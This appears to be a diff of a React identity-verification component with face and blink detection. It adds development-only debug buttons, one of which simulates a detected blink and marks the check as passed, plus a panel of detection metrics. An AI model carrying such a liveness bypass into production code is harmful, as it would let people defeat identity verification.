@@ -994,6 +1155,78 @@ export default function VerificacionIdentidad() {
                       </svg>
                     </div>
                   </div>
+
+                  {/* Botones de debug (solo en desarrollo) */}
+                  {process.env.NODE_ENV === 'development' && (
+                    <div style={{ marginTop: '10px', display: 'flex', justifyContent: 'center', gap: '10px' }}>
+                      <button
+                        onClick={() => {
+                          console.log("🔧 DEBUG: Simulando parpadeo");
+                          blinkDetectedRef.current = true;
+                          setFormState(prev => ({
+                            ...prev,
+                            ok: true,
+                            error: false,
+                            estadoEspabilar: true
+                          }));
+                        }}
+                        style={{
+                          padding: '5px 10px',
+                          fontSize: '12px',
+                          backgroundColor: '#666',
+                          color: 'white',
+                          border: 'none',
+                          borderRadius: '3px'
+                        }}
+                      >
+                        Simular Parpadeo
+                      </button>
+
+                      <button
+                        onClick={() => {
+                          console.log("🔧 DEBUG: Forzar grabación");
+                          startRecording();
+                        }}
+                        style={{
+                          padding: '5px 10px',
+                          fontSize: '12px',
+                          backgroundColor: '#666',
+                          color: 'white',
+                          border: 'none',
+                          borderRadius: '3px'
+                        }}
+                      >
+                        Forzar Grabación
+                      </button>
+                    </div>
+                  )}
+
+                  {/* Información de debug (solo en desarrollo) */}
+                  {process.env.NODE_ENV === 'development' && (
+                    <div style={{
+                      marginTop: '10px',
+                      padding: '10px',
+                      backgroundColor: 'rgba(0,0,0,0.7)',
+                      borderRadius: '5px',
+                      fontSize: '12px',
+                      color: '#fff',
+                      textAlign: 'left'
+                    }}>
+                      <div><strong>DEBUG INFO:</strong></div>
+                      <div>Rostros detectados: {debugInfo.faceCount}</div>
+                      <div>EAR Izquierdo: {debugInfo.earLeft}</div>
+                      <div>EAR Derecho: {debugInfo.earRight}</div>
+                      <div>EAR Promedio: {debugInfo.earAvg}</div>
+                      <div>Estado: {formState.ok ? '✅ OK' : formState.error ? '❌ ERROR' : '⏳ Esperando'}</div>
+                      <div>Tiempo estable: {stableTime.toFixed(1)}s</div>
+                      <div>Progreso: {(progress * 100).toFixed(1)}%</div>
+                      <div>Blink detectado: {blinkDetectedRef.current ? '✅' : '❌'}</div>
+                      {debugInfo.errorMessage && (
+                        <div>Error: {debugInfo.errorMessage}</div>
+                      )}
+                    </div>
+                  )}
+
                   <div>
                     {/* MENSAJE */}
                     {(formState.error && formState.cargando == false) && (
@@ -1025,7 +1258,8 @@ export default function VerificacionIdentidad() {
                       </p>
                     )}
                   </div>
-                </> : null}
+                </>
+              )}
 
               <div className="step-container mt-4 mb-4">
                 {/* Slot 1 */}
@@ -1111,4 +1345,4 @@ export default function VerificacionIdentidad() {
         <Loading /> : null}
     </>
   );
-};
+}
